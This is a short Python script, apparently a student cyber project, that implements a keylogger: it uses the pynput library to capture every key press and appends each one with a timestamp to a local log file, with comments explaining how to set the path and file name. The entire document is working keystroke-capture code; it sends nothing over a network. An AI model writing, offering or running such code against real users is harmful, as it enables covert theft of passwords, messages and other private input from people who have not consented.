import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir=r"C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger" #Path of folder in which you have saved this keylogger python code
logging.basicConfig(filename=(log_dir+"keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s') #In place of "keylogger.txt" you can give any name and with this name your file will be created which contains key stokes

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()
